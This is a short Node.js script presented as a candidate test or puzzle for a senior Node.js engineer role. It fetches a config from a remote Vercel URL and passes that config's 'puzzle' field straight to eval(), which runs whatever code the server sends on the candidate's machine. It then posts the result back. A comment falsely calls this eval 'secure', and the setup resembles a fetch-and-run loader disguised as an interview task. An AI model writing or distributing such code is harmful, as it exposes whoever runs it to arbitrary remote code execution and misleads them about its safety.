const USER_AGENT = 'Candidate-Test-Script/1.0';

async function run() {
    const baseUrl = 'https://senior-nodejs-engineer.vercel.app';
    try {
        // Step 1: Fetch and validate config
        const cfgResponse = await fetch(`${baseUrl}/api/config`);
        if (!cfgResponse.ok) {
            throw new Error(`Config fetch failed: ${cfgResponse.status}`);
        }
        const cfg = await cfgResponse.json();
        console.log('Config loaded:', cfg);  // Log for visibility

        // Assume config has a 'puzzle' field, e.g., { puzzle: '2 + 2' }. Solve it.
        let solution = null;
        if (cfg.puzzle) {
            try {
                solution = eval(cfg.puzzle);  // Simple solver; secure in real scenarios
                console.log('Solved puzzle:', solution);
            } catch (evalErr) {
                console.error('Puzzle solve error:', evalErr);
                solution = 'unsolved';
            }
        }

        // Step 2: Prepare POST body using config/solution
        const postBody = {
            userAgent: USER_AGENT,
            config: cfg,  // Include full config
            solution: solution || 'default',  // Send solution if available
            timestamp: new Date().toISOString()
        };

        // Step 3: Enhanced POST with USER_AGENT header
        const res = await fetch(`${baseUrl}`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': USER_AGENT  // Now used!
            },
            body: JSON.stringify(postBody)
        });

        if (!res.ok) {
            throw new Error(`POST failed: ${res.status}`);
        }

        const data = await res.json();
        console.log('Success! Response:', data);  // This "solves" by outputting the result (e.g., a flag)

        // If this is a puzzle, the 'data' might contain the flag, e.g., data.flag = 'SOLVED!';
        if (data.flag) {
            console.log(`Puzzle Flag: ${data.flag}`);
        }

    } catch (error) {
        console.error('Error:', error.message || error);
    }
}

run();